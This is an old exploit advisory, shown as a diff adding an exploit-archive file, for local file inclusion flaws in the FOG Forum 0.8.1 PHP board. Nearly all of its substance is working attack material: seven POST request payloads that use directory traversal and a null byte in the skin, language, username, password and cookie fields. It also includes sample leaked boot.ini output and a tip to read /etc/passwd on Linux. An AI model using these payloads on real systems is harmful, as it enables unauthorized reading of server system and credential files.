@@ -1,0 +1,67 @@
+=======================================================
+ FOG Forum 0.8.1 Local File Inclusion Vulnerabilities
+=======================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 10 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : FOG Forum - PHP Board Engine
+ VERSION     : 0.8.1
+ VENDOR      : http://fog.daviveno.org
+ DOWNLOAD    : http://fog.daviveno.org/streamearth/go_dl.php?download=1
+#####################################################
+
+---Local File Inclusion Exploit (POST Method)---
+
+---Description---
+
+[+]Use Web Proxy (Web Scarab, Burb Proxy, etc...) to intercept POST Method and edit in request data.
+[+]All LFI Exploits were Vulnerablilities with POST Method
+
+##############################################
+Vulnerable File/Path:
+
+[+]http://[Target]/[Path]/index.php
+
+##############################################
+
+---LFI Exploits (Use WebScarab to Edit request data)---
+
+Send Request Data:
+
+fog_skin=default&fog_lang=../../../../../../../../boot.ini%00
+fog_skin=../../../../../../../../boot.ini%00&fog_lang=francais
+fog_pseudo=../../../../../../../../boot.ini%00&fog_password=cwhmail@cwh.com&fog_cook=0&fog_action=0&fog_userid=cwhmail@cwh.com&fog_path=http://localhost/forum/index.php
+fog_posted=../../../../../../../../boot.ini%00&fog_pseudo=cwhmail@cwh.com&fog_password=cwhmail@cwh.com&fog_cook=0
+fog_posted=1&fog_pseudo=../../../../../../../../boot.ini%00&fog_password=cwhmail@cwh.com&fog_cook=0
+fog_posted=1&fog_pseudo=cwhmail@cwh.com&fog_password=../../../../../../../../boot.ini%00&fog_cook=0
+fog_posted=1&fog_pseudo=cwhmail@cwh.com&fog_password=cwhmail@cwh.com&fog_cook=../../../../../../../../boot.ini%00
+
+Note: This exploit will open boot.ini in system file:
+
+[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect [boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+
+      You can change boot.ini to /etc/passwd%00 in linux OS.
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-11]
